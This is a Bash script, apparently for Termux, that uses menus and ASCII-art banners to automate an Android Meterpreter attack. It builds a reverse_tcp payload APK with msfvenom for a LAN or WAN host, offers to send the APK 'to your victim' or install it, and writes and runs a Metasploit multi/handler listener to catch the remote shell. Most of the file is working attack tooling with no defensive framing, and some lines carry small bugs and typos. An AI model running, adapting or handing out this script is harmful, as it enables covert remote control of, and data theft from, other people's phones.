#!/usr/bin/env bash
echo -e "
▄▀█ █░█ ▀█▀ █▀█ █▀▄▀█ ▄▀█ ▀█▀ █ █▀█ █▄░█
█▀█ █▄█ ░█░ █▄█ █░▀░█ █▀█ ░█░ █ █▄█ █░▀█" | lolcat
echo
echo -e "¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
_¶¶___________________________________¶¶
_¶¶___________________________________¶¶
__¶¶_________________________________¶¶_
__¶¶_________________________________¶¶_
___¶¶_______________________________¶¶__
___¶¶______________________________¶¶___
____¶¶¶__________________________¶¶¶____
_____¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶_____
_______¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶_______
_________¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶_________
___________¶¶¶¶¶_¶¶¶¶¶¶¶_¶¶¶¶___________
______________¶¶¶¶_¶¶¶_¶¶¶______________
________________¶¶¶_¶_¶¶________________
_________________¶¶¶_¶¶_________________
__________________¶¶_¶¶_________________
__________________¶¶_¶__________________
__________________¶¶_¶¶_________________
________________¶¶¶_¶_¶¶¶_______________
_____________¶¶¶¶¶__¶__¶¶¶¶¶____________
__________¶¶¶¶¶_____¶_____¶¶¶¶__________
________¶¶¶¶________¶_______¶¶¶¶¶_______
_______¶¶¶__________¶__________¶¶¶¶_____
_____¶¶¶____________¶____________¶¶¶____
____¶¶¶_____________¶______________¶¶___
___¶¶¶______________¶_______________¶¶__
___¶¶_______________¶________________¶¶_
__¶¶________________¶________________¶¶_
__¶¶_______________¶¶¶________________¶_
__¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶
__¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶
__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
" | pv -qL 500 | lolcat
echo
echo -e "
▒█▄░▒█ ▒█▄░▒█ ▒█▀▀█ 
▒█▒█▒█ ▒█▒█▒█ ▒█░░░ 
▒█░░▀█ ▒█░░▀█ ▒█▄▄█" | lolcat
echo
printf "\033[1;34mSELECT AN OPTION \033[0m\n"
echo
printf "\033[1;33m1>TO OPEN METASPLOIT \033[0m\n"
printf "\033[1;33m2>TO EXIT \033[0m\n"
echo
while true; do
printf "\033[1;34mGIVE OPTION==> \033[0m"
read opt
#<<..............programing..............>>
if [[ $opt = '1' || $opt = '01' ]]; then
echo
printf "\033[1;36mIT'S STARTING \033[0m\n"
printf "\033[1;36m................ \033[0m\n" | pv -qL 30
echo
echo
break
else
printf "\033[1;32m[\033[1;31m!\033[1;32m]\033[1;31mEnter a valid option!\033[0m\n"
fi
done
CWD=$(pwd)
while true; do
printf "\e[1;31mYou are generating payload for (LAN/WAN) ==> \e[1;92m"
read lwan
printf "\n"
if [[ $lwan == LAN ]] || [[ $lwan == lan ]]; then
printf "\e[1;31mEnter LHOST==>\e[0m "
read lht
echo
printf "\e[1;31mEnter LPORT==>\e[0m "
read lpt
break
elif [[ $lwan == WAN ]] || [[ $lwan == wan ]]; then
printf "\e[1;31mEnter forwarded HOST==>\e[0m "
read flht
echo
printf "\e[1;31mEnter forwarded PORT==>\e[0m "
read flpt
echo
printf "\e[1;31mEnter LPORT==>\e[0m "
read lpt
break
else
printf "\e[1;31mERROR: PLEASE ENTER A VALID OPTION FROM (LAN/lan) and (WAN/wan)\e[0m\n"
echo
fi
done
printf "\n"
printf "\e[1;31mEnter a name for your payload==>\e[0m "
read pld
printf "\n"
printf "\e[1;94mProcessing\e[0m"
printf "\e[1;94m.\e[0m"
sleep 0.3
printf "\e[1;94m.\e[0m"
sleep 0.3
printf "\e[1;94m.\e[0m"
sleep 0.3
printf "\e[1;94m.\e[0m"
sleep 0.3
printf "\e[1;94m.\e[0m\n"
sleep 0.3
printf "\n"
if [[ $lwan == LAN ]] || [[ $lwan == lan ]]; then
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lht LPORT=$lpt R>${pld}.apk /sdcard
elif [[ $lwan == WAN ]] || [[ $lwan == wan ]]; then
msfvenom -p android/meterpreter/reverse_tcp LHOST=$flht LPORT=$flpt R>${pld}.apk /sdcard
fi
sleep 5
cd $CWD
mv -v ${pld}.apk /sdcard
sleep 0.5
printf "\n"

printf "\e[1;33m\e[104mChoose any from option:-\e[0m\n"
echo
while true; do
printf "\e[2;32m01. Send the payload to your victim\e[om\n"
printf "\e[2;32m02. Install payload in this device\e[0m\n"
printf "\e[2;32m03. Start exploit\e[0m\n"
printf "\e[2;32m04. Remove the apk\e[0m\n"
printf "\e[2;32m>>Run 'quit' to exit\e[0m\n"
echo
printf "\e[1;36mEnter your option==> \e[1;32m"
read option
echo
if [[ $option == 1 ]] || [[ $option == 01 ]]
then
cd /sdcard && xdg-open --send ${pld}.apk
cd $CWD
elif [[ $option == 2 ]] || [[ $option == 02 ]]
then
cd /sdcard && xdg-open ${pld}.apk
cd $CWD
elif [[ $option == 3 ]] || [[ $option == 03 ]]
then
mkdir -p $PREFIX/tmp
cd $PREFIX/tmp
echo "use exploit/multi/handler" > run
echo "set payload android/meterpreter/reverse_tcp" >> run
if [[ $lwan == LAN ]] || [[ $lwan == lan ]]; then
echo "set lhost $lht" >> run
elif [[ $lwan == WAN ]] || [[ $lwan == wan ]]; then
echo "set lhost $flht" >> run
fi
echo "set lport $lpt" >> run
echo "show options" >> run
echo "exploit" >> run
msfconsole -r run
cd - &> /dev/null
cd $PRIFIX/tmp; rm -rf run
cd $CWD
elif [[ $option == 4 ]] || [[ $option == 04 ]]
then
cd $HOME && cd /sdcard && rm -rf ${pld}.apk
cd $CWD
elif [[ $option == quit ]]
then
unset CWD
exit
else
printf "(•) \e[1;31m>>>please choose a valid option\e[0m\n"
fi
done
